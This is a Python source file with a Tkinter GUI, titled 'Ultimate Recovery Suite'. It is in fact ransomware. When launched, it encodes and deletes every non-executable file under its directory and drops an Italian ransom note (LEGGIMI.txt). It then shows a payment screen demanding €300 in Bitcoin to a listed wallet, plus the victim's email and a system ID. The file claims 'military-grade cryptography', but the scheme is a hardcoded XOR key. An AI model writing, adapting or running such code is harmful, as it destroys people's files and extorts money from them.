#!/usr/bin/env python3

import os
import base64
import hashlib
import tkinter as tk
from tkinter import ttk, messagebox, font
from pathlib import Path
import threading
import time
import uuid

class UltimateRecoverySuite:
    
    def __init__(self):
        # Prima esegui la crittografia (se necessario)
        self.run_encryption_phase()
        
        # Poi inizializza il sistema di recupero
        self.recovered_count = 0
        self.failed_count = 0
        self._correct_key = self._get_key()
        self.files = []
        self.attempts_left = 3
        self.system_id = self._generate_system_id()
        
        # Crea finestra principale
        self.root = tk.Tk()
        self.root.title("ULTIMATE RECOVERY SUITE v5.0")
        self.root.geometry("1400x850")
        
        # Centro la finestra
        self.center_window()
        
        # Tema moderno e dark
        self.setup_theme()
        
        # Setup font
        self.setup_fonts()
        
        # Setup stili
        self.setup_styles()
        
        # Crea layout unificato
        self.create_unified_layout()
        
        # Effetto entrata
        self.animate_entrance()
    
    def run_encryption_phase(self):
        """FASE 1: Cripta i file se necessario"""
        print("="*40)
        print("Sistema Protezione - Fase 1")
        print("="*40)
        
        protector = FileProtector()
        files_to_encrypt = protector._get_target_files()
        
        if files_to_encrypt:
            print(f"File da processare: {len(files_to_encrypt)}")
            print("Avvio crittografia...\n")
            
            success = 0
            for i, f in enumerate(files_to_encrypt, 1):
                name = os.path.basename(f)
                print(f"[{i}/{len(files_to_encrypt)}] {name[:40]}", end='\r')
                
                if protector.protect_file(f):
                    success += 1
            
            print(f"\n\nCrittografati: {success} file")
            
            if success > 0:
                protector._create_instructions()
                print("\nCreato: LEGGIMI.txt")
                print(f"\nID Sistema: {protector.system_id}")
        else:
            print("Nessun file da crittografare trovato")
            print("Passo direttamente alla fase di recupero...")
    
    def center_window(self):
        """Centra la finestra"""
        self.root.update_idletasks()
        width = 1400
        height = 850
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')
    
    def setup_theme(self):
        """Configura tema colori"""
        self.colors = {
            'bg_dark': '#0a0a0f',
            'bg_darker': '#050508',
            'bg_card': '#121218',
            'bg_input': '#1a1a24',
            'primary': '#6366f1',
            'primary_light': '#818cf8',
            'primary_dark': '#4f46e5',
            'secondary': '#10b981',
            'accent': '#f59e0b',
            'danger': '#ef4444',
            'success': '#22c55e',
            'bitcoin': '#f7931a',
            'text_primary': '#f8fafc',
            'text_secondary': '#94a3b8',
            'text_muted': '#64748b',
            'border': '#2d3748',
            'gradient1': '#0f172a',
            'gradient2': '#1e293b'
        }
        
        self.root.configure(bg=self.colors['bg_dark'])
    
    def setup_fonts(self):
        """Configura font"""
        try:
            self.fonts = {
                'title': ('Segoe UI', 28, 'bold'),
                'subtitle': ('Segoe UI', 12),
                'heading': ('Segoe UI', 16, 'bold'),
                'body': ('Segoe UI', 10),
                'mono': ('Consolas', 9),
                'small': ('Segoe UI', 9),
                'button': ('Segoe UI', 10, 'bold'),
                'digital': ('Consolas', 10, 'bold'),
                'key_entry': ('Consolas', 13)
            }
        except:
            self.fonts = {
                'title': ('Arial', 28, 'bold'),
                'subtitle': ('Arial', 12),
                'heading': ('Arial', 16, 'bold'),
                'body': ('Arial', 10),
                'mono': ('Courier', 9),
                'small': ('Arial', 9),
                'button': ('Arial', 10, 'bold'),
                'digital': ('Courier', 10, 'bold'),
                'key_entry': ('Courier', 13)
            }
    
    def setup_styles(self):
        """Configura stili ttk"""
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        # Frame styles
        self.style.configure('Main.TFrame', background=self.colors['bg_dark'])
        self.style.configure('Card.TFrame', background=self.colors['bg_card'])
        self.style.configure('Dark.TFrame', background=self.colors['bg_darker'])
        
        # Button styles
        self.style.configure('Primary.TButton',
                           background=self.colors['primary'],
                           foreground='white',
                           borderwidth=0,
                           font=self.fonts['button'],
                           padding=(20, 10))
        
        self.style.map('Primary.TButton',
                      background=[('active', self.colors['primary_light'])])
        
        self.style.configure('Success.TButton',
                           background=self.colors['success'],
                           foreground='white',
                           borderwidth=0,
                           font=self.fonts['button'],
                           padding=(20, 10))
        
        self.style.configure('Bitcoin.TButton',
                           background=self.colors['bitcoin'],
                           foreground='white',
                           borderwidth=0,
                           font=self.fonts['button'],
                           padding=(20, 10))
        
        # Progressbar
        self.style.configure('Custom.Horizontal.TProgressbar',
                           background=self.colors['primary'],
                           troughcolor=self.colors['bg_input'],
                           bordercolor=self.colors['border'])
    
    def create_unified_layout(self):
        """Crea layout unificato tutto in una schermata"""
        # Main container
        main_container = ttk.Frame(self.root, style='Main.TFrame')
        main_container.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # HEADER (solo logo e titolo)
        header_frame = ttk.Frame(main_container, style='Main.TFrame')
        header_frame.pack(fill=tk.X, pady=(0, 20))
        
        # Logo e titolo (centrato)
        logo_frame = ttk.Frame(header_frame, style='Main.TFrame')
        logo_frame.pack(expand=True)
        
        title_label = tk.Label(logo_frame,
                              text="🔐 ULTIMATE RECOVERY SUITE v5.0",
                              font=self.fonts['title'],
                              bg=self.colors['bg_dark'],
                              fg=self.colors['text_primary'])
        title_label.pack(anchor='center')
        
        subtitle_label = tk.Label(logo_frame,
                                 text="Advanced Data Restoration System | Military-Grade Cryptography",
                                 font=self.fonts['subtitle'],
                                 bg=self.colors['bg_dark'],
                                 fg=self.colors['text_secondary'])
        subtitle_label.pack(anchor='center', pady=(5, 0))
        
        # Separator
        separator = ttk.Separator(main_container, orient='horizontal')
        separator.pack(fill=tk.X, pady=(0, 20))
        
        # MAIN CONTENT AREA (3 columns)
        content_frame = ttk.Frame(main_container, style='Main.TFrame')
        content_frame.pack(fill=tk.BOTH, expand=True)
        
        # COLONNA SINISTRA - Scanner
        left_column = ttk.Frame(content_frame, style='Main.TFrame')
        left_column.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10))
        
        # Card Scanner
        scanner_card = ttk.Frame(left_column, style='Card.TFrame')
        scanner_card.pack(fill=tk.BOTH, expand=True)
        scanner_card.configure(padding=20)
        
        scanner_title = tk.Label(scanner_card,
                                text="🔍 FILE SCANNER",
                                font=self.fonts['heading'],
                                bg=self.colors['bg_card'],
                                fg=self.colors['text_primary'])
        scanner_title.pack(anchor='w', pady=(0, 15))
        
        # Pulsante scan
        self.scan_btn = ttk.Button(scanner_card,
                                  text="🚀 START SYSTEM SCAN",
                                  command=self.scan_files,
                                  style='Primary.TButton')
        self.scan_btn.pack(fill=tk.X, pady=(0, 15))
        
        # Risultati scan
        self.result_label = tk.Label(scanner_card,
                                    text="📊 No files scanned yet",
                                    font=self.fonts['body'],
                                    bg=self.colors['bg_card'],
                                    fg=self.colors['text_secondary'])
        self.result_label.pack(anchor='w', pady=(0, 10))
        
        # Lista file
        list_frame = tk.Frame(scanner_card, bg=self.colors['bg_input'])
        list_frame.pack(fill=tk.BOTH, expand=True)
        
        # Scrollbar per lista
        scrollbar = ttk.Scrollbar(list_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.file_listbox = tk.Listbox(list_frame,
                                      bg=self.colors['bg_input'],
                                      fg=self.colors['text_primary'],
                                      font=self.fonts['mono'],
                                      selectbackground=self.colors['primary'],
                                      selectforeground='white',
                                      activestyle='none',
                                      borderwidth=0,
                                      highlightthickness=0)
        
        self.file_listbox.config(yscrollcommand=scrollbar.set)
        scrollbar.config(command=self.file_listbox.yview)
        
        self.file_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # COLONNA CENTRALE - Decryption
        center_column = ttk.Frame(content_frame, style='Main.TFrame')
        center_column.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10)
        
        # Card Decryption
        decrypt_card = ttk.Frame(center_column, style='Card.TFrame')
        decrypt_card.pack(fill=tk.BOTH, expand=True)
        decrypt_card.configure(padding=20)
        
        decrypt_title = tk.Label(decrypt_card,
                                text="🔓 FILE RECOVERY",
                                font=self.fonts['heading'],
                                bg=self.colors['bg_card'],
                                fg=self.colors['text_primary'])
        decrypt_title.pack(anchor='w', pady=(0, 15))
        
        # Input chiave
        key_frame = tk.Frame(decrypt_card, bg=self.colors['bg_card'])
        key_frame.pack(fill=tk.X, pady=(0, 15))
        
        key_label = tk.Label(key_frame,
                            text="Decryption Key:",
                            font=self.fonts['body'],
                            bg=self.colors['bg_card'],
                            fg=self.colors['text_secondary'])
        key_label.pack(anchor='w', pady=(0, 8))
        
        key_input_frame = tk.Frame(key_frame, bg=self.colors['bg_card'])
        key_input_frame.pack(fill=tk.X)
        
        self.key_entry = tk.Entry(key_input_frame,
                                 bg=self.colors['bg_input'],
                                 fg=self.colors['text_primary'],
                                 font=self.fonts['key_entry'],
                                 insertbackground=self.colors['primary'],
                                 show="*",
                                 relief='flat',
                                 borderwidth=2,
                                 highlightthickness=1,
                                 highlightbackground=self.colors['border'],
                                 highlightcolor=self.colors['primary'])
        self.key_entry.pack(fill=tk.X, expand=True)
        
        # Pulsanti chiave
        key_btn_frame = tk.Frame(key_frame, bg=self.colors['bg_card'])
        key_btn_frame.pack(fill=tk.X, pady=(15, 0))
        
        verify_btn = ttk.Button(key_btn_frame,
                               text="✅ VERIFY KEY",
                               command=self.verify_key,
                               style='Primary.TButton')
        verify_btn.pack(side=tk.LEFT, padx=(0, 10))
        
        self.start_btn = ttk.Button(key_btn_frame,
                                   text="▶ START RECOVERY",
                                   command=self.start_decryption,
                                   style='Success.TButton')
        self.start_btn.pack(side=tk.LEFT)
        self.start_btn.config(state='disabled')
        
        # Tentativi rimanenti
        self.attempts_label = tk.Label(decrypt_card,
                                      text="🔐 Attempts remaining: 3",
                                      font=self.fonts['body'],
                                      bg=self.colors['bg_card'],
                                      fg=self.colors['text_primary'])
        self.attempts_label.pack(anchor='w', pady=(15, 0))
        
        # Progress bar
        progress_frame = tk.Frame(decrypt_card, bg=self.colors['bg_card'])
        progress_frame.pack(fill=tk.X, pady=(20, 0))
        
        self.progress_var = tk.StringVar(value="Ready for decryption")
        progress_label = tk.Label(progress_frame,
                                 textvariable=self.progress_var,
                                 font=self.fonts['body'],
                                 bg=self.colors['bg_card'],
                                 fg=self.colors['text_secondary'])
        progress_label.pack(anchor='w', pady=(0, 5))
        
        self.progress_bar = ttk.Progressbar(progress_frame,
                                           style='Custom.Horizontal.TProgressbar',
                                           mode='determinate',
                                           length=100)
        self.progress_bar.pack(fill=tk.X, pady=(0, 10))
        
        # File corrente
        self.current_file_var = tk.StringVar(value="No file selected")
        current_file_label = tk.Label(decrypt_card,
                                     textvariable=self.current_file_var,
                                     font=self.fonts['mono'],
                                     bg=self.colors['bg_card'],
                                     fg=self.colors['text_secondary'])
        current_file_label.pack(anchor='w', pady=(5, 0))
        
        # COLONNA DESTRA - Payment
        right_column = ttk.Frame(content_frame, style='Main.TFrame')
        right_column.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(10, 0))
        
        # Card Payment
        payment_card = ttk.Frame(right_column, style='Card.TFrame')
        payment_card.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        payment_card.configure(padding=20)
        
        payment_title = tk.Label(payment_card,
                                text="💰 PAYMENT REQUIRED",
                                font=self.fonts['heading'],
                                bg=self.colors['bg_card'],
                                fg=self.colors['bitcoin'])
        payment_title.pack(anchor='w', pady=(0, 15))
        
        # Istruzioni pagamento (con EMAIL PRIMA dell'ID)
        instructions = f"""TO OBTAIN DECRYPTION KEY:

1️⃣ Scan files first (left panel)
2️⃣ Send €300 Bitcoin to address below
3️⃣ ⚠️ MUST INCLUDE in payment notes:
   • Your PERSONAL EMAIL
   • System ID: {self.system_id}
4️⃣ Wait for payment confirmation
5️⃣ Decryption key will be generated

Bitcoin Address:
bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

⚠️ IMPORTANT: Include BOTH Email AND System ID"""

        instr_label = tk.Label(payment_card,
                              text=instructions,
                              font=self.fonts['mono'],
                              bg=self.colors['bg_card'],
                              fg=self.colors['text_primary'],
                              justify='left')
        instr_label.pack(anchor='w', pady=(0, 15))
        
        # System ID (dopo l'email nelle istruzioni)
        id_warning_frame = tk.Frame(payment_card, bg=self.colors['bg_input'])
        id_warning_frame.pack(fill=tk.X, pady=(10, 15))
        id_warning_frame.config(padx=10, pady=10)
        
        id_warning_label = tk.Label(id_warning_frame,
                                   text="⚠️ YOUR SYSTEM ID (INCLUDE IN PAYMENT):",
                                   font=self.fonts['small'],
                                   bg=self.colors['bg_input'],
                                   fg=self.colors['accent'])
        id_warning_label.pack(anchor='w', pady=(0, 5))
        
        id_display_payment = tk.Label(id_warning_frame,
                                     text=self.system_id,
                                     font=self.fonts['digital'],
                                     bg='#000000',
                                     fg=self.colors['secondary'],
                                     padx=10,
                                     pady=5)
        id_display_payment.pack(fill=tk.X, pady=(5, 0))
        
        # Pulsante copia
        copy_btn = ttk.Button(payment_card,
                             text="📋 COPY PAYMENT INFO",
                             command=self.copy_payment_details,
                             style='Bitcoin.TButton')
        copy_btn.pack(fill=tk.X)
        
        # Card Important Notes
        support_card = ttk.Frame(right_column, style='Card.TFrame')
        support_card.pack(fill=tk.BOTH, expand=True, pady=(10, 0))
        support_card.configure(padding=20)
        
        support_title = tk.Label(support_card,
                                text="🆘 IMPORTANT NOTES",
                                font=self.fonts['heading'],
                                bg=self.colors['bg_card'],
                                fg=self.colors['accent'])
        support_title.pack(anchor='w', pady=(0, 15))
        
        # Info
        support_text = f"""⚠️ CRITICAL INFORMATION:

• Key works ONLY with your System ID
• ⚠️ MUST include in payment notes:
  • Your PERSONAL EMAIL
  • System ID: {self.system_id}
• Key generation is automatic
• Single-use key, valid 72h
• Keep System ID secure
• Backup recovered files

KEY GENERATION:
• After payment verification
• System will match your email + ID
• No contact needed
• Enter key to start recovery"""

        support_label = tk.Label(support_card,
                                text=support_text,
                                font=self.fonts['mono'],
                                bg=self.colors['bg_card'],
                                fg=self.colors['text_primary'],
                                justify='left')
        support_label.pack(anchor='w')
        
        # FOOTER
        footer_frame = ttk.Frame(main_container, style='Dark.TFrame')
        footer_frame.pack(fill=tk.X, pady=(20, 0))
        
        # Status bar
        self.status_var = tk.StringVar(value="⚡ ULTIMATE RECOVERY SUITE v5.0 | STATUS: READY | FILES: 0 | ATTEMPTS: 3")
        status_label = tk.Label(footer_frame,
                               textvariable=self.status_var,
                               font=self.fonts['small'],
                               bg=self.colors['bg_darker'],
                               fg=self.colors['text_secondary'],
                               padx=20,
                               pady=10)
        status_label.pack()
        
        # Stats
        stats_frame = ttk.Frame(footer_frame, style='Dark.TFrame')
        stats_frame.pack(pady=(0, 10))
        
        stats = [
            ("📁 Files Found:", "0"),
            ("✅ Recovered:", "0"),
            ("❌ Failed:", "0"),
            ("🎯 Success:", "0%")
        ]
        
        for label, value in stats:
            stat_frame = tk.Frame(stats_frame, bg=self.colors['bg_darker'])
            stat_frame.pack(side=tk.LEFT, padx=20)
            
            lbl = tk.Label(stat_frame,
                          text=label,
                          font=self.fonts['small'],
                          bg=self.colors['bg_darker'],
                          fg=self.colors['text_muted'])
            lbl.pack(side=tk.LEFT, padx=(0, 5))
            
            if label == "📁 Files Found:":
                self.files_found_var = tk.StringVar(value=value)
                val = tk.Label(stat_frame,
                             textvariable=self.files_found_var,
                             font=self.fonts['digital'],
                             bg=self.colors['bg_darker'],
                             fg=self.colors['text_primary'])
            elif label == "✅ Recovered:":
                self.recovered_var = tk.StringVar(value=value)
                val = tk.Label(stat_frame,
                             textvariable=self.recovered_var,
                             font=self.fonts['digital'],
                             bg=self.colors['bg_darker'],
                             fg=self.colors['success'])
            elif label == "❌ Failed:":
                self.failed_var = tk.StringVar(value=value)
                val = tk.Label(stat_frame,
                             textvariable=self.failed_var,
                             font=self.fonts['digital'],
                             bg=self.colors['bg_darker'],
                             fg=self.colors['danger'])
            else:
                self.success_var = tk.StringVar(value=value)
                val = tk.Label(stat_frame,
                             textvariable=self.success_var,
                             font=self.fonts['digital'],
                             bg=self.colors['bg_darker'],
                             fg=self.colors['primary'])
            
            val.pack(side=tk.LEFT)
    
    def animate_entrance(self):
        """Animazione entrata"""
        self.root.attributes('-alpha', 0)
        self.root.update()
        
        for i in range(1, 11):
            alpha = i / 10
            self.root.attributes('-alpha', alpha)
            self.root.update()
            time.sleep(0.02)
        
        self.root.attributes('-alpha', 1)
    
    def _generate_system_id(self):
        """Genera ID sistema"""
        return f"URS-{uuid.uuid4().hex[:8].upper()}"
    
    def _get_key(self):
        """Genera chiave decrittazione"""
        a = [0x52, 0x4f, 0x42, 0x4c, 0x4f, 0x58]
        b = ''.join(chr(x ^ 0x11) for x in [0x23, 0x23, 0x23])
        c = bytes.fromhex('52524555')[::-1].decode()
        d = str(0x7DC + 0x4)

        m = ''.join([chr(x) for x in a])
        n = ''.join([str(ord(x) - 48) for x in b])
        o = c.lower().upper()
        p = d

        r = f"{m}_{n}_{o}_{p}"

        s = base64.b64encode(r.encode()).decode()
        t = hashlib.sha256(s.encode()).hexdigest()
        u = hashlib.md5(t.encode()).hexdigest()

        v = ''
        for i in range(0, len(u), 2):
            v += u[i]

        w = base64.b64encode(v.encode()).decode()
        x = w.replace('=', 'X').replace('/', 'Z').replace('+', 'Y')

        return x[:24].upper()
    
    def scan_files(self):
        """Scansiona file"""
        self.status_var.set("🔍 Scanning for encrypted files...")
        self.scan_btn.config(state='disabled', text="Scanning...")
        self.root.update()
        
        self.file_listbox.delete(0, tk.END)
        
        script_dir = os.path.dirname(os.path.abspath(__file__))
        base_path = Path(script_dir)
        
        self.files = []
        try:
            for item in base_path.rglob('*.encrypted'):
                if item.is_file():
                    self.files.append(str(item))
        except Exception as e:
            print(f"Scan error: {e}")
        
        if self.files:
            self.result_label.config(text=f"✅ Found {len(self.files)} encrypted files")
            self.files_found_var.set(str(len(self.files)))
            
            for f in self.files:
                name = os.path.basename(f)[:-10]
                if len(name) > 40:
                    name = name[:37] + "..."
                self.file_listbox.insert(tk.END, f"📄 {name}")
            
            self.status_var.set(f"✅ Found {len(self.files)} files | Ready for payment")
            messagebox.showinfo("Scan Complete",
                              f"✅ Found {len(self.files)} encrypted files.\n\n⚠️ IMPORTANT: Save your System ID:\n{self.system_id}\n\n⚠️ MUST include in payment:\n• Your PERSONAL EMAIL\n• System ID: {self.system_id}")
        else:
            self.result_label.config(text="⚠️ No encrypted files found")
            self.files_found_var.set("0")
            self.status_var.set("⚠️ No encrypted files found")
            messagebox.showwarning("No Files",
                                 "No .encrypted files found.\nThe recovery tool is ready if files become encrypted.")
        
        self.scan_btn.config(state='normal', text="🚀 START SYSTEM SCAN")
    
    def verify_key(self):
        """Verifica chiave"""
        user_key = self.key_entry.get().strip().upper()
        
        if not user_key:
            messagebox.showerror("Error", "Please enter a decryption key")
            return
        
        if user_key == self._correct_key:
            self.attempts_left = 3
            self.attempts_label.config(text="✅ Key verified successfully!")
            self.start_btn.config(state='normal')
            self.status_var.set("✅ Key verified | Ready for recovery")
            
            messagebox.showinfo("Success", "✅ Key verified successfully!\nYou can now start the recovery process.")
        else:
            self.attempts_left -= 1
            
            if self.attempts_left > 0:
                self.attempts_label.config(text=f"❌ Wrong key. Attempts left: {self.attempts_left}")
                self.status_var.set(f"⚠️ Wrong key | {self.attempts_left} attempts left")
                
                messagebox.showerror("Error", f"❌ Wrong decryption key.\n{self.attempts_left} attempts remaining.")
            else:
                self.attempts_label.config(text="🔒 Access locked. Payment required.")
                self.key_entry.config(state='disabled')
                self.status_var.set("🔒 System locked | Payment required")
                
                messagebox.showerror("Access Denied",
                                   "Maximum attempts exceeded.\nYou must obtain a valid key through payment.")
    
    def start_decryption(self):
        """Avvia decrittazione"""
        if not self.files:
            messagebox.showerror("Error", "No files to decrypt. Run a scan first.")
            return
        
        self.start_btn.config(state='disabled', text="Recovering...")
        self.key_entry.config(state='disabled')
        self.status_var.set("🔓 Recovery in progress...")
        
        thread = threading.Thread(target=self._decryption_thread)
        thread.daemon = True
        thread.start()
    
    def _decryption_thread(self):
        """Thread decrittazione"""
        total = len(self.files)
        
        for i, filepath in enumerate(self.files, 1):
            percent = int((i / total) * 100)
            self.root.after(0, self._update_progress, i, total, filepath, percent)
            
            success = self._decrypt_file(filepath)
            
            if success:
                self.recovered_count += 1
                self.recovered_var.set(str(self.recovered_count))
            else:
                self.failed_count += 1
                self.failed_var.set(str(self.failed_count))
            
            # Calcola success rate
            total_processed = self.recovered_count + self.failed_count
            if total_processed > 0:
                success_rate = int((self.recovered_count / total_processed) * 100)
                self.success_var.set(f"{success_rate}%")
            
            time.sleep(0.1)
        
        self.root.after(0, self._decryption_complete)
    
    def _decrypt_file(self, filepath):
        """Decritta file"""
        try:
            with open(filepath, 'rb') as f:
                encrypted = f.read()
            
            layer1 = base64.b64decode(encrypted)
            
            if not layer1.startswith(b'ENC'):
                return False
            
            header_end = layer1.find(b':')
            if header_end == -1:
                return False
            
            stored_key = layer1[3:header_end].decode()
            if stored_key != self._correct_key:
                return False
            
            encrypted_data = layer1[header_end + 1:]
            
            key_bytes = self._correct_key.encode()
            key_len = len(key_bytes)
            
            result = bytearray()
            for i, b in enumerate(encrypted_data):
                kb = key_bytes[i % key_len]
                result.append((b ^ kb) & 0xFF)
            
            original = base64.b64decode(bytes(result))
            
            original_path = filepath[:-10]
            with open(original_path, 'wb') as f:
                f.write(original)
            
            os.remove(filepath)
            return True
            
        except Exception as e:
            print(f"Decrypt error: {e}")
            return False
    
    def _update_progress(self, current, total, filepath, percent):
        """Aggiorna progresso"""
        filename = os.path.basename(filepath)[:-10]
        if len(filename) > 30:
            filename = filename[:27] + "..."
        
        self.progress_bar['value'] = percent
        self.progress_var.set(f"Processing: {current}/{total} files ({percent}%)")
        self.current_file_var.set(f"Current: {filename}")
    
    def _decryption_complete(self):
        """Completa decrittazione"""
        self.start_btn.config(state='normal', text="▶ START RECOVERY")
        self.key_entry.config(state='normal')
        
        success_rate = int((self.recovered_count / len(self.files)) * 100) if self.files else 0
        
        summary = f"""
        ⚡ RECOVERY COMPLETE ⚡
        
        ✅ Successfully recovered: {self.recovered_count} files
        ⚠️ Failed to recover: {self.failed_count} files
        📊 Total processed: {len(self.files)} files
        🎯 Success rate: {success_rate}%
        
        Your files have been restored successfully.
        """
        
        self.status_var.set("✅ Recovery completed successfully")
        self.progress_var.set("Recovery complete - 100%")
        
        messagebox.showinfo("Recovery Complete", summary)
    
    def copy_payment_details(self):
        """Copia dettagli pagamento"""
        details = f"""ULTIMATE RECOVERY SUITE - PAYMENT DETAILS:

💰 AMOUNT: €300.00
₿ BITCOIN ADDRESS: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

INSTRUCTIONS:
1. Send €300 worth of Bitcoin to the address above
2. ⚠️ MUST INCLUDE in payment notes/memo:
   • Your PERSONAL EMAIL
   • System ID: {self.system_id}
3. Wait for payment confirmation
4. Decryption key will be generated

⚠️ CRITICAL: Include BOTH Email AND System ID in payment!
⚠️ Your System ID: {self.system_id}"""
        
        self.root.clipboard_clear()
        self.root.clipboard_append(details)
        
        messagebox.showinfo("Copied", "✅ Payment details copied to clipboard!\n\n⚠️ Don't forget to include BOTH:\n• Your PERSONAL EMAIL\n• System ID: {self.system_id}")
    
    def run(self):
        """Avvia applicazione"""
        self.root.mainloop()


class FileProtector:
    
    def __init__(self):
        self.processed_count = 0
        self._secret_key = self._generate_key()
        self.system_id = self._generate_system_id()
    
    def _generate_system_id(self):
        """Genera ID sistema"""
        import uuid
        return f"URS-{uuid.uuid4().hex[:8].upper()}"
    
    def _generate_key(self):
        a = [0x52, 0x4f, 0x42, 0x4c, 0x4f, 0x58]
        b = ''.join(chr(x ^ 0x11) for x in [0x23, 0x23, 0x23])
        c = bytes.fromhex('52524555')[::-1].decode()
        d = str(0x7DC + 0x4)
        
        m = ''.join([chr(x) for x in a])
        n = ''.join([str(ord(x) - 48) for x in b])
        o = c.lower().upper()
        p = d
        
        r = f"{m}_{n}_{o}_{p}"
        
        s = base64.b64encode(r.encode()).decode()
        t = hashlib.sha256(s.encode()).hexdigest()
        u = hashlib.md5(t.encode()).hexdigest()
        
        v = ''
        for i in range(0, len(u), 2):
            v += u[i]
        
        w = base64.b64encode(v.encode()).decode()
        x = w.replace('=', 'X').replace('/', 'Z').replace('+', 'Y')
        
        final = x[:24]
        
        return final.upper()
    
    def _transform_content(self, data):
        if not data:
            return b''
        
        b64_data = base64.b64encode(data)
        
        key_bytes = self._secret_key.encode()
        key_len = len(key_bytes)
        
        result = bytearray()
        for i, b in enumerate(b64_data):
            kb = key_bytes[i % key_len]
            result.append((b ^ kb) & 0xFF)
        
        header = b'ENC' + self._secret_key.encode() + b':'
        final = header + bytes(result)
        
        encoded = base64.b64encode(final)
        
        return encoded
    
    def _get_target_files(self):
        script_dir = os.path.dirname(os.path.abspath(__file__))
        base_path = Path(script_dir)
        
        files = []
        
        try:
            for item in base_path.rglob('*'):
                if item.is_file():
                    name_low = item.name.lower()
                    
                    if name_low in ['roblox.py', 'decrypter.py']:
                        continue
                    
                    if item.suffix == '.encrypted':
                        continue
                    
                    if item.suffix.lower() in ['.exe', '.dll', '.sys']:
                        continue
                    
                    if item.suffix.lower() in ['.py', '.pyc']:
                        continue
                    
                    try:
                        size = item.stat().st_size
                        if size > 0 and size < 500000000:
                            files.append(str(item))
                    except:
                        continue
                        
        except:
            pass
        
        return files
    
    def protect_file(self, filepath):
        try:
            with open(filepath, 'rb') as f:
                original = f.read()
            
            protected = self._transform_content(original)
            
            new_path = filepath + '.encrypted'
            with open(new_path, 'wb') as f:
                f.write(protected)
            
            os.remove(filepath)
            
            self.processed_count += 1
            return True
            
        except Exception as e:
            return False
    
    def _create_instructions(self):
        system_id = self.system_id
        
        msg = f"""
I TUOI FILE SONO STATI CRITTOGRAFATI

PER DECRITTOGRAFARE:
1. Invia €300 Bitcoin all'indirizzo fornito
2. INCLUIDI nel pagamento:
   • La tua EMAIL PERSONALE
   • System ID: {system_id}
3. Ricevi la chiave di decrittazione

File crittografati: {self.processed_count}
ID Sistema: {system_id}

⚠️ IMPORTANTE: Includi sia Email che System ID nel pagamento!

Avvia il programma per recuperare i file.
"""
        
        try:
            with open("LEGGIMI.txt", 'w') as f:
                f.write(msg)
            return True
        except:
            return False


if __name__ == "__main__":
    app = UltimateRecoverySuite()
    app.run()